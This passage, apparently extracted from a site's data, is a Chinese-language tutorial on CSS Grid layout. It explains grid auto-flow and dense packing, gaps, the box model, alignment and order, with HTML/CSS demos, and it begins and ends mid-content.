}\n*[class*="14"] { color: hsl(312,67%,50%); background: hsla(312,67%,50%,0.2); border-color: darkOrchid; }\n*[class*="15"] { color: hsl(336,67%,50%); background: hsla(336,67%,50%,0.2); border-color: darkSalmon; }\n*[class*="16"] { color: hsl(360,67%,50%); background: hsla(360,67%,50%,0.2); border-color: feldspar; }\n\n</style>\n</head>\n<body>\n    <div class="float">\n        <span class="box01">1</span><span class="box02 wide">2</span><span class="box03">3</span>\n        <span class="box04">4</span><span class="box05">5</span><span class="box06">6</span>\n        <span class="box07">7</span><span class="box08 tall">8</span><span class="box09">9</span>\n        <span class="box10">10</span><span class="box11 wide tall">11</span><span class="box12">12</span>\n        <span class="box13">13</span><span class="box14">14</span><span class="box15">15</span>\n        <span class="box16">16</span>\n    </div>\n    <div class="grid">\n        <span class="box01">1</span><span class="box02 wide">2</span><span class="box03">3</span>\n        <span class="box04">4</span><span class="box05">5</span><span class="box06">6</span>\n        <span class="box07">7</span><span class="box08 tall">8</span><span class="box09">9</span>\n        <span class="box10">10</span><span class="box11 wide tall">11</span><span class="box12">12</span>\n        <span class="box13">13</span><span class="box14">14</span><span class="box15">15</span>\n        <span class="box16">16</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\n以上代码效果图：\n\n\n浮动规则中有一条“如果前面元素左浮动，那么后面浮动元素的左边界必定处于前面元素右边界的右侧，除非后面浮动元素的顶边在前面浮动元素的下边”。11和12所在行没有13的位置了，11的左右都有13所需要的空间，但是由于前面这条规则，13只能放在11的右侧了。你可能想为什么不与14、15和16放在一行呢？因为浮动规则中还有一条“满足其他条件后，浮动元素要尽可能上移”，所以13只能放在12的下面且11的右侧了。而网格流并没有这样的限制，它只需要保证“不超出前面元素顶边”就可以了（上面例子的右边这部分里的13就可以放在11的左侧了，但12仍旧和浮动场景一样，不能超过前面元素的顶边）。\n\n\n# 5.3 密集流\n\n“不超出前面元素顶边”是为了保证元素编号的不错乱，其实有一种密集流可以让网格元素紧靠着不用管什么编号顺序了，grid-auto-flow: row dense;是行优先的密集流，grid-auto-flow: column dense;是列优先的密集流。下面这个例子左边的12才不管前面的顶边在哪，会直接占据上面的空位；同样右边的11才不会管前面的左边界在哪，会直接占据左边的空位。\n\n<html>\n<head>\n<style>\nspan { box-sizing: border-box; }\n\n.grid {display: inline-grid;\n    grid-template-columns: repeat(4, 80px);\n    grid-template-rows: repeat(4, 80px);\n    grid-auto-columns: 80px;\n    grid-auto-rows: 80px;\n    vertical-align: top;\n    margin-right: 5em;\n}\n#g1 {grid-auto-flow: row dense;}\n#g2 {grid-auto-flow: column dense;}\n\n#g1 span {align-items: start; padding-top: 0.25em;}\n#g2 span {justify-content: flex-start; padding-left: 0.25em;}\n\n.wide {grid-column: auto / span 2;}\n.tall {grid-row: auto / span 2;}\n\nspan[class*="box"] { font-size: 1.5em; border: 5px solid; }\n*[class*="01"] { color: hsl(0,67%,50%); background: hsla(0,67%,50%,0.2); border-color: skyblue; }\n*[class*="02"] { color: hsl(24,67%,50%); background: hsla(24,67%,50%,0.2); border-color: salmon; }\n*[class*="03"] { color: hsl(48,67%,50%); background: hsla(48,67%,50%,0.2); border-color: hotPink; }\n*[class*="04"] { color: hsl(72,67%,50%); background: hsla(72,67%,50%,0.2); border-color: lawnGreen; }\n*[class*="05"] { color: hsl(96,67%,50%); background: hsla(96,67%,50%,0.2); border-color: blueViolet; }\n*[class*="06"] { color: hsl(120,67%,50%); background: hsla(120,67%,50%,0.2); border-color: burlyWood; }\n*[class*="07"] { color: hsl(144,67%,50%); background: hsla(144,67%,50%,0.2); border-color: chartreuse; }\n*[class*="08"] { color: hsl(168,67%,50%); background: hsla(168,67%,50%,0.2); border-color: chocolate; }\n*[class*="09"] { color: hsl(192,67%,50%); background: hsla(192,67%,50%,0.2); border-color: cornflowerBlue; }\n*[class*="10"] { color: hsl(216,67%,50%); background: hsla(216,67%,50%,0.2); border-color: cyan; }\n*[class*="11"] { color: hsl(240,67%,50%); background: hsla(240,67%,50%,0.2); border-color: darkGoldenRod; }\n*[class*="12"] { color: hsl(264,67%,50%); background: hsla(264,67%,50%,0.2); border-color: darkMagenta; }\n*[class*="13"] { color: hsl(288,67%,50%); background: hsla(288,67%,50%,0.2); border-color: darkorange; }\n*[class*="14"] { color: hsl(312,67%,50%); background: hsla(312,67%,50%,0.2); border-color: darkOrchid; }\n*[class*="15"] { color: hsl(336,67%,50%); background: hsla(336,67%,50%,0.2); border-color: darkSalmon; }\n*[class*="16"] { color: hsl(360,67%,50%); background: hsla(360,67%,50%,0.2); border-color: feldspar; }\n\n</style>\n</head>\n<body>\n    <div class="grid" id="g1">\n        <span class="box01">1</span><span class="box02 wide">2</span><span class="box03">3</span>\n        <span class="box04">4</span><span class="box05">5</span><span class="box06">6</span>\n        <span class="box07">7</span><span class="box08 tall">8</span><span class="box09">9</span>\n        <span class="box10">10</span><span class="box11 wide tall">11</span><span class="box12">12</span>\n        <span class="box13">13</span><span class="box14">14</span><span class="box15">15</span>\n        <span class="box16">16</span>\n    </div>\n    <div class="grid" id="g2">\n        <span class="box01">1</span><span class="box02 wide">2</span><span class="box03">3</span>\n        <span class="box04">4</span><span class="box05">5</span><span class="box06">6</span>\n        <span class="box07">7</span><span class="box08 tall">8</span><span class="box09">9</span>\n        <span class="box10 wide tall">10</span><span class="box11">11</span><span class="box12">12</span>\n        <span class="box13">13</span><span class="box14">14</span><span class="box15">15</span>\n        <span class="box16">16</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n\n\n以上代码效果图：\n\n\n\n# 六、元素在网格空间中的布局\n\n\n# 6.1 栏距\n\n栏距就是两个网格轨道之间的距离，给网格单元之间添加间隔，与表格布局中的border-spacing很像。具体使用的是grid-row-gap和grid-column-gap，不能取百分比也不能使用fr，只能使用常用的距离单位px、rem等。当然，栏距有简写属性grid-gap: xxx xxx，第一个值就是行间距，第二个字就是列间距。\n\n<html>\n<head>\n<style>\n    .grid { display: grid; width: 500px; height: 500px; border: 1px solid;\n        grid-template-rows: 150px 1fr 150px; grid-template-columns: 15% 1fr 1fr;\n        grid-column-gap: 1em; grid-row-gap: 25px; }\n    span[class*="box"] { font-size: 1.5em; border: 5px solid; }\n    *[class*="01"] { color: hsl(0,67%,50%); background: hsla(0,67%,50%,0.2); border-color: skyblue; }\n    *[class*="02"] { color: hsl(24,67%,50%); background: hsla(24,67%,50%,0.2); border-color: salmon; }\n    *[class*="03"] { color: hsl(48,67%,50%); background: hsla(48,67%,50%,0.2); border-color: hotPink; }\n    *[class*="04"] { color: hsl(72,67%,50%); background: hsla(72,67%,50%,0.2); border-color: lawnGreen; }\n    *[class*="05"] { color: hsl(96,67%,50%); background: hsla(96,67%,50%,0.2); border-color: blueViolet; }\n    *[class*="06"] { color: hsl(120,67%,50%); background: hsla(120,67%,50%,0.2); border-color: burlyWood; }\n    *[class*="07"] { color: hsl(144,67%,50%); background: hsla(144,67%,50%,0.2); border-color: chartreuse; }\n    *[class*="08"] { color: hsl(168,67%,50%); background: hsla(168,67%,50%,0.2); border-color: chocolate; }\n    *[class*="09"] { color: hsl(192,67%,50%); background: hsla(192,67%,50%,0.2); border-color: cornflowerBlue; }\n</style>\n</head>\n<body>\n    <div class="grid boxed gridlines" id="g1">\n        <span class="box01">1</span><span class="box02">2</span><span class="box03">3</span>\n        <span class="box04">4</span><span class="box05">5</span><span class="box06">6</span>\n        <span class="box05">7</span><span class="box03">8</span><span class="box01">9</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n以上代码效果图：\n\n\n\n# 6.2 网格元素的盒模型\n\n在添加网格元素这节里，我们确定了添加网格元素后它所在区域的空间大小，也就是我们这节所说的网格空间。网格空间可以跨好几个网格单元，网格单元之间由于栏距还可以有间隔，这都是网格空间本身的性质。\n\n网格元素在网格空间里布局时，可能因为网格元素本身的盒模型而让网格元素显示的效果而不同（但不会影响网格空间）。其实可以把它看作是一种父子元素的布局，如果子元素（网格元素）是块级元素，那完全可以使用块级元素的隐藏等式，也就是margin-left + border-left-width + padding-left + width + padding-right + border-right-width + margin-right = the width of the parent element\n\n<html>\n<head>\n<style>\n    .grid { display: grid; height: 200px; width: 400px;\n        border: 1px solid;\n        grid-template-rows: repeat(2, 100px);\n        grid-template-columns: repeat(2, 200px);}\n    .box02 {margin: 25px;}\n    .box03 {margin: -25px 0;}\n    span[class*="box"] { font-size: 1.5em; border: 5px solid; }\n    *[class*="01"] { color: hsl(0,67%,50%); border-color: skyblue; }\n    *[class*="02"] { color: hsl(24,67%,50%); border-color: salmon; }\n    *[class*="03"] { color: hsl(48,67%,50%); border-color: hotPink; }\n    *[class*="04"] { color: hsl(72,67%,50%); border-color: lawnGreen; }\n</style>\n</head>\n<body>\n    <div class="grid boxed gridlines" id="g1">\n        <span class="box01">1</span><span class="box02">2</span>\n        <span class="box03">3</span><span class="box04">4</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n以上代码效果图：\n\n\n可以看到上面这个例子，4个盒子的宽高都是auto，如果都没有内外边距，那么他们都是刚好占满网格空间，box1和box4都是如此。而box2和box3是带了外边距的，box2是正值的外边距，又由于网格空间的宽度始终不变，那么box2的宽度会往内部缩小；box3是负值的外边距，又由于网格空间的宽度始终不变，那么box3的宽度会往外部增大。宽度也是可以这么解释的。\n\n在块级元素的隐藏等式下，如果宽度固定，左右的外边距会根据具体的情况进行变化。比如，左右外边距都设置了值，按照书写模式一般会舍弃右外边距；如果右外边距设置的是固定值，左外边距设置的是auto，那么左外边距会自动变化；如果左外边距设置的是固定值，右外边距设置的是auto，那么右外边距会自动变化。这些都是盒模型布局中常见的知识了。\n\n\n# 6.3 网格元素的绝对定位\n\n其实与块级元素一样，网格元素使用定位时也有一个定位元素的隐藏等式。即使宽高是固定值，“舍弃”以及“auto”与上一节虽然类似但还是比较复杂的，具体可以参考absolute绝对定位。\n\n<html>\n<head>\n<style>\n    #grid {display: grid; width: 500px;\n        grid-template-rows: repeat(3, 100px);\n        grid-template-columns: repeat(5, 100px); }\n    span { border: 1px dotted red; }\n    .exel { grid-row: 2 / 4; grid-column: 2 / 5; position: relative; }\n    .exel i { border: 5px solid skyblue;}\n    .exel i {\n        position: absolute;\n        top: 10px; bottom: 20px;\n        left: 30px; right: 40px; }\n</style>\n</head>\n<body>\n    <div class="grid boxed lines" id="grid">\n        <span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span>\n        <span class="exel"><i class="box01">exel</i></span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n以上代码效果图：\n\n\ngrid-row-end: auto和grid-column-end: auto，这两个对网格元素盒模型和绝对定位是有影响的，情况不好确定，先留在这里等后面有时间再来研究了。\n\n\n# 七、网格的对齐方式\n\n网格布局的对齐方式与弹性盒布局的对齐方式十分相像，可以看下表。\n\n属性                对齐目标               适用于\njustify-self      行内方向（横向）上的单个网格元素   网格元素\njustify-items     行内方向（横向）上的全部网格元素   网格容器\njustify-content   行内方向（横向）上的整个网格     网格容器\nalign-self        块级方向（纵向）上的单个网格元素   网格元素\nalign-items       块级方向（纵向）上的全部网格元素   网格容器\nalign-content     块级方向（纵向）上的整个网格     网格容器\n\n\n# 7.1 xxx-self\n\njustify-self（横向）和align-self（纵向）是针对某个网格元素来说的，也就是说它设置在网格元素上的。它们共同拥有6个值：\n\n * start：让网格元素向网格空间的起边对齐。不受网格空间的direction: xxx;影响，但受到网格容器的direction: xxx;影响。\n * end：让网格元素向网格空间的终边对齐。不受网格空间的direction: xxx;影响，但受到网格容器的direction: xxx;影响。\n * center：在对齐轴上居中对齐。\n * self-start：让网格元素向网格空间的书写模式的起边对齐。只受网格空间本身的direction: xxx;影响。\n * self-end：让网格元素向网格空间的书写模式的终边对齐。只受网格空间本身的direction: xxx;影响。\n * stretch：拉伸，但必须保证网格元素对应的宽或高是auto不然不会进行拉伸。\n\njustify-self独有的2个值：\n\n * left：横向上就是居左对齐，不受任何direction: xxx;影响。\n * right：横向上就是居右对齐，不受任何direction: xxx;影响。\n\nalign-self独有的1个值：\n\n * baseline：让当前网格元素与同一轨道中最低的那个网格元素的baseline进行对齐。\n\n<html>\n<head>\n<style>\nbody {width: auto;}\n.grid {display: grid; padding: 0.5em; margin: 0.25em 0 2em;\n    grid-gap: 0.75em 0.5em;}\n#g1 {grid-template-rows: 6em; grid-template-columns: repeat(10, 9em);}\n#g2 {grid-template-rows: 6em; grid-template-columns: repeat(10, 9em);}\n\nh1 {grid-row: span 1 / 1; grid-column: 1 / span 8;\n     background: rgba(0,0,0,0.15);\n     padding: 0.5em 0 0.25em;\n    text-align: center; font: 1.33em Helvetica, sans-serif; margin: 0;}\nh1 code {font: 1.1em monospace, serif;}\n\n#g1 [class*="box"] {height: auto; align-self: center;}\n#g2 [class*="box"] {width: auto; justify-self: center;}\n\n#g1 .box01 {justify-self: start;}\n#g1 .box02 {justify-self: end;}\n#g1 .box03 {justify-self: center;}\n#g1 .box04 {justify-self: self-start; direction: rtl;}\n#g1 .box05 {justify-self: self-end; direction: rtl;}\n#g1 .box06 {justify-self: stretch;}\n#g1 .box07 {justify-self: left;}\n#g1 .box08 {justify-self: right;}\n\n#g2 .box01 {align-self: start;}\n#g2 .box02 {align-self: end;}\n#g2 .box03 {align-self: center;}\n#g2 .box04 {align-self: self-start; }\n#g2 .box05 {align-self: self-end; }\n#g2 .box06 {align-self: stretch;}\n#g2 .box07 {align-self: baseline;}\n\ndiv[id] span[class*="box"] {box-sizing: border-box; border: 2px solid; background: transparent;}\n\nspan[class*="01"] {grid-row: 1; grid-column: 1;}\nspan[class*="02"] {grid-row: 1; grid-column: 2;}\nspan[class*="03"] {grid-row: 1; grid-column: 3;}\nspan[class*="04"] {grid-row: 1; grid-column: 4;}\nspan[class*="05"] {grid-row: 1; grid-column: 5;}\nspan[class*="06"] {grid-row: 1; grid-column: 6;}\nspan[class*="07"] {grid-row: 1; grid-column: 7;}\nspan[class*="08"] {grid-row: 1; grid-column: 8;}\nspan[class*="gridline"] {color: blue; border: 1px dashed; margin: -1px 0 0 -1px;}\n</style>\n</head>\n<body>\n    <div class="grid small" id="g1">\n        <h1><code>justify-self</code> values <em>(inline-axis alignment)</em></h1>\n        <span class="box01">start</span><span class="box02">end</span>\n        <span class="box03">center</span><span class="box04">self-start (RTL)</span>\n        <span class="box05">self-end (RTL)</span><span class="box06">stretch</span>\n        <span class="box07">left</span><span class="box08">right</span>\n        <span class="gridline01"></span><span class="gridline02"></span>\n        <span class="gridline03"></span><span class="gridline04"></span>\n        <span class="gridline05"></span><span class="gridline06"></span>\n        <span class="gridline07"></span><span class="gridline08"></span>\n    </div>\n    <div class="grid small" id="g2">\n        <h1><code>align-self</code> values<em>(block-axis alignment)</em></h1>\n        <span class="box01">start</span><span class="box02">end</span>\n        <span class="box03">center</span><span class="box04">self-start (RTL)</span>\n        <span class="box05">self-end (RTL)</span><span class="box06">stretch</span>\n        <span class="box07">baseline</span>\n        <span class="gridline01"></span><span class="gridline02"></span>\n        <span class="gridline03"></span><span class="gridline04"></span>\n        <span class="gridline05"></span><span class="gridline06">\n        </span><span class="gridline07">Xx</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n\n\n以上代码效果图：\n\n\n\n# 7.2 xxx-items\n\njustify-items（横向）和align-items（纵向）是针对网格容器中所有网格元素而言的（但是设置在网格容器上），可以使用xxx-self进行单个覆盖，也就是说xxx-self的取值也适用于xxx-items。\n\n\n# 7.3 xxx-content\n\njustify-content（横向）和align-content（纵向）是针对网格容器中所有网格单元而言的，一般用于网格单元总空间小于网格容器时（剩余空间）。它们共同拥有6个值：\n\n * start：默认值，让所有网格单元按照横轴的起边对齐，也就是让剩余空间全部放到横轴的终边。受到网格容器的direction: xxx;影响\n * end：让所有网格单元按照横轴的终边对齐，也就是让剩余空间全部放到横轴的起边。受到网格容器的direction: xxx;影响\n * center：让所有网格单元在横轴中间对齐，也就是让剩余空间放到横轴两边，网格单元之间不留空隙。\n * space-between：网格单元之间的空间会相同，第一个网格单元与start之间不留空隙，最后一个网格单元与end之间不留空隙。\n * space-around：网格单元之间的空间会相同，第一个网格单元与start有空隙而其数值是网格单元之间空隙的一半，最后一个网格单元与end有空隙而其数值是网格单元之间空隙的一半。\n * space-evenly：网格单元之间的空间会相同，第一个网格单元与start有空隙而其数值就等于网格单元之间的空隙，最后一个网格单元与end有空隙而其数值就等于网格单元之间的空隙。\n\njustify-content（横向）独有left和right属性（align-content没有这两个值），不受到网格容器的direction: xxx;影响。\n\n<html>\n<head>\n<style>\nbody {width: auto;}\n.grid { display: grid; border: 1px solid;\n    grid-template-rows: 45px;\n    grid-template-columns: repeat(5, 96px); }\n\nh1 { margin: 13px 0 0 2px; padding: 0; text-align: center; }\nh1 code {font: 16px monospace, serif;}\n\n#g1 {justify-content: start;direction: rtl;}\n#g2 {justify-content: end;direction: rtl;}\n#g3 {justify-content: center;}\n#g4 {justify-content: space-between;}\n#g5 {justify-content: space-around;}\n#g6 {justify-content: space-evenly;}\n#g7 {justify-content: right;direction: rtl;}\n#g8 {justify-content: left;direction: rtl;}\n\nspan {border: 1px dashed; }\ndiv[id] span[class*="box"] {box-sizing: border-box; background: hsla(117,50%,50%,0.25);}\n\nspan[class*="01"] {grid-row: 1; grid-column: 1;}\nspan[class*="02"] {grid-row: 1; grid-column: 2;}\nspan[class*="03"] {grid-row: 1; grid-column: 3;}\nspan[class*="04"] {grid-row: 1; grid-column: 4;}\nspan[class*="05"] {grid-row: 1; grid-column: 5;}\n\n</style>\n</head>\n<body>\n    <h1><code>justify-content: start</code></h1>\n    <div class="grid small" id="g1">\n        <span class="box01"></span><span class="box02"></span>\n        <span class="box03"></span><span class="box04"></span>\n        <span class="box05"></span>\n    </div>\n    <h1><code>justify-content: end</code></h1>\n    <div class="grid small" id="g2">\n        <span class="box01"></span><span class="box02"></span>\n        <span class="box03"></span><span class="box04"></span>\n        <span class="box05"></span>\n    </div>\n    <h1><code>justify-content: center</code></h1>\n    <div class="grid small" id="g3">\n        <span class="box01"></span><span class="box02"></span>\n        <span class="box03"></span><span class="box04"></span>\n        <span class="box05"></span>\n    </div>\n    <h1><code>justify-content: space-between</code></h1>\n    <div class="grid small" id="g4">\n        <span class="box01"></span><span class="box02"></span>\n        <span class="box03"></span><span class="box04"></span>\n        <span class="box05"></span>\n    </div>\n    <h1><code>justify-content: space-around</code></h1>\n    <div class="grid small" id="g5">\n        <span class="box01"></span><span class="box02"></span>\n        <span class="box03"></span><span class="box04"></span>\n        <span class="box05"></span>\n    </div>\n    <h1><code>justify-content: space-evenly</code></h1>\n    <div class="grid small" id="g6">\n        <span class="box01"></span><span class="box02"></span>\n        <span class="box03"></span><span class="box04"></span>\n        <span class="box05"></span>\n    </div>\n    <h1><code>justify-content: right</code></h1>\n    <div class="grid small" id="g7">\n        <span class="box01"></span><span class="box02"></span>\n        <span class="box03"></span><span class="box04"></span>\n        <span class="box05"></span>\n    </div>\n    <h1><code>justify-content: left</code></h1>\n    <div class="grid small" id="g8">\n        <span class="box01"></span><span class="box02"></span>\n        <span class="box03"></span><span class="box04"></span>\n        <span class="box05"></span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n\n\n以上代码效果图：\n\n\n\n# 八、分层和排序\n\n在4.4 元素重叠以及异常处理就出现了元素重叠的现象，它们的重叠顺序是根据网格元素原码顺序而来的，是可以通过传统的z-index进行更改，也可以通过order进行网格元素顺序的更改以达到改变重叠顺序的目的。\n\norder属性设置在网格元素上，用于更改网格元素的顺序，但是如果使用grid-row或grid-column等进行强制的网格元素添加，order会失效。也就是说order一般用于网格流上。\n\n默认情况下，所有网格元素被分配为“0”的顺序。网格元素的order为负值时，将会显示在默认值“0”之前；网格元素的order为正值时，将会显示在默认值“0”之后。如果一些网格元素的order相同，则按照源顺序显示。\n\n<html>\n<head>\n<style>\n    #grid {display: grid; width: 80%; height: 9em;\n        border: 1px solid;\n        grid-auto-flow: column;\n        grid-columns: repeat(5, 1fr);}\n    span {border: 1px dotted red; margin: 3px;}\n    span[class*="box"]::before {content: attr(class);}\n    .box02 { order: -1; }\n    .box03 { order: -2; }\n    .box04 { order: 1; }\n</style>\n</head>\n<body>\n    <div class="grid boxed lines" id="grid">\n        <span class="box01"></span>\n        <span class="box02"></span>\n        <span class="box03"></span>\n        <span class="box04"></span>\n        <span class="box05"></span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n以上代码效果图：\n',normalizedContent:'# 网格布局\n\n\n# 一、网格布局简介\n\n网格(grid)布局是一种二维布局，将内容按照行与列的格式进行排版。可以定义网格线的重复模式，将元素附加到这些网格线上。\n\n通过声明display: grid或display: inline-grid在元素上激活grid布局。该元素会作为一个网格容器，与flex布局类似，让直接子元素作为网格项，其他后代并不会成为网格项。\n\nps：浮动元素会遮盖后方紧挨着的块级元素，但不会遮盖后方紧挨着的网格容器。块级元素嵌套可能会有外边距折叠，而网格容器嵌套是没有外边距嵌套的。\n\n有一些 css 属性和特性并不适用于网格容器和网格项：\n\n * css3的多列属性（column-count、column-width等）应用在grid容器时会被忽略；\n * 伪元素::first-line和::first-letter应用在grid容器时会被忽略；\n * float和clear应用在grid容器时会被忽略；float对网格项还是有影响的；\n * vertical-align对grid项没有影响。\n\n\n# 二、网格容器组成\n\ngrid容器是一个“容器”，换句话说，它是一个“格式上下文”。在bfc就提到过这个概念，它是页面中一个独立的渲染区域，拥有自己的渲染规则，会隔离内部元素与外部元素。\n\n\n\n * 网格轨道（grid track）是两个相邻的网格线之间的连续轨道。列轨道其实是块轴轨道，行轨道其实是内联轨道。\n * 网格单元（grid cell）是由四条网格线围绕的空间，没有网格线贯穿其中，类似于表格单元。它不能直接用css网格属性来处理。\n * 网格区域（grid area）是由四条网格线围成的矩形区域，由一个或多个网格单元组成。它可以使用css网格属性来处理，并将网格项与它们关联。\n\n值得注意的是网格项并不是与网格区域强关联的，网格区域可以不放网格项。网格区域可以重叠，也就是它们共用网格单元，对应的网格项也就可以重叠了。\n\n\n# 三、放置网格线\n\ngrid-template-rows与grid-template-columns是用于定义（放置）网格线的，取值是none | <track-list> | <auto-track-list>。其中none表示不明确的网格（默认值），所有的行和其大小都将由grid-auto-rows属性隐式的指定。<track-list> | <auto-track-list>就比较复杂了，后面会一一介绍。\n\n网格线是可以进行命名的，使用数字编号或者其他字词，也是可以数字和字词混用也就是有多个名字，不过要注意网格线不要重复命名（分属于行和列的可以重复）。\n\n\n# 3.1 固定轨道\n\n让grid-template-rows和grid-template-columns取相对固定的值。非负值的长度大小<length>，非负值且相对于网格容器的<percentage>。\n\n这里说的“固定”意思是网格线之间的距离不随网格轨道中内容的变化而变化。\n\n<html>\n<head>\n    <style>\n    .grid {\n        display: inline-grid;\n        /* 固定宽度，并且给网格线进行命名 */\n        grid-template-columns: [start col-a] 200px [col-b] 50% [col-c] 100px [stop end last];\n        /* 固定宽度，并且给网格线进行命名。可以将其中的80%换成minmax(300px, 400px) */\n        grid-template-rows: [start masthead] 50px [content] 80% [footer] 30px [stop end];\n        width: 700px; height: 400px; border: 1px solid;\n    }\n    .gridlines { text-align: center; border: 1px dashed; }\n    ul li { display: flex; }\n    ul li i { color: rebeccapurple; }\n    .labels1 {\n        display: grid; grid-template-columns: 200px 50% 100px 50px;\n        width: 700px; padding: 0; margin-bottom: 0;\n    }\n    .labels1 li {\n        justify-content: flex-end; align-items: start; flex-flow: column; border-left: 1px solid;\n    }\n    .labels2 {\n        display: inline-grid; grid-template-rows: 50px 80% 30px;\n        height: 400px; padding: 0; margin-left: 0; margin-top: 0; vertical-align: top;\n    }\n    .labels2 li { border-top: 1px solid; }\n    .labels2 li i::after { content: " || "; margin-right: 4px; }\n    .labels2 li i:last-child::after { content: ""; }\n    </style>\n</head>\n<body>\n    <section>\n        <ul class="labels1">\n            <li class="col"><i>start</i><i>col-a</i><i>1</i></li>\n            <li class="col"><i>col-b</i><i>2</i></li>\n            <li class="col"><i>col-c</i><i>3</i></li>\n            <li class="col"><i>stop</i><i>end</i><i>last</i><i>4</i></li>\n        </ul>\n        <div class="grid">\n            <span class="gridlines"></span><span class="gridlines"></span>\n            <span class="gridlines"></span><span class="gridlines"></span>\n            <span class="gridlines"></span><span class="gridlines"></span>\n            <span class="gridlines"></span><span class="gridlines"></span>\n            <span class="gridlines"></span>\n        </div>\n        <ul class="labels2">\n            <li class="col"><i>start</i><i>masthead</i><i>1</i></li>\n            <li class="col"><i>content</i><i>2</i></li>\n            <li class="col"><i>footer</i><i>3</i></li>\n            <li class="col"><i>stop</i><i>end</i><i>4</i></li>\n        </ul>\n    </section>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n\n\n代码效果图：\n\n\n上面这个例子里第二列的宽度是网格容器的一半大小，虽然会随着网格容器宽度而变化，但不会根据网格项的内容而变化。\n\n如果第二行content的高度为100%，它会将第三行挤出网格容器，这不会我们想要的结果，那么可以使用minmax(a, b)来约束第二行content的高度，其中“a”是最小尺寸，“b”是最大尺寸。grid-template-rows: [start masthead] 50px [content] minmax(320px, 100%) [footer] 30px [stop end];\n\nminmax(a, b)中，如果“b”小于“a”，“b”将会被抛弃，“a”会作为固定值使用。觉得minmax(a, b)不好用那可以试试calc()。\n\n\n# 3.2 弹性轨道\n\n让grid-template-rows与grid-template-columns取比较灵活的值，fr单位就可以将可用（剩余）空间按照比例进行分配。例如grid-template-columns: 1fr 1fr 1fr 1fr;相当于grid-template-columns: 25% 25% 25% 25%;。另外就是固定轨道和弹性轨道混搭使用，可以看下面的例子\n\n<html>\n<head>\n    <style>\n    section {position: relative;}\n    .grid {\n        display: grid; width: 800px; height: 15em;\n        grid-template-columns: 15em 4.5fr 3fr 10%;\n        grid-template-rows: 1fr; border: 1px solid;\n    }\n    .gridlines { display: grid; border: 1px dashed; }\n    .gridlines i { height: 1.2em; }\n    .gridlines i.col.measure {\n        align-self: center; justify-self: stretch;\n        text-align: center; height: 1.2em;\n    }\n    </style>\n</head>\n<body>\n    <section>\n        <div class="grid boxed lines">\n            <span class="gridlines"><i class="col measure">15em</i></span>\n            <span class="gridlines"><i class="col measure">4.5fr</i></span>\n            <span class="gridlines"><i class="col measure">3fr</i></span>\n            <span class="gridlines"><i class="col measure">10%</i></span>\n        </div>\n    </section>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n代码效果图：\n\n\n也可以使用minmax(a, b)，例如grid-template-columns: 15em 4.5fr 3fr 10%;改为grid-template-columns: 15em 4.5fr minmax(5em, 3fr) 10%;，但要记住fr不能用在minmax的第一个参数上。改成grid-template-columns: 15em 1fr minmax(0, 500px) 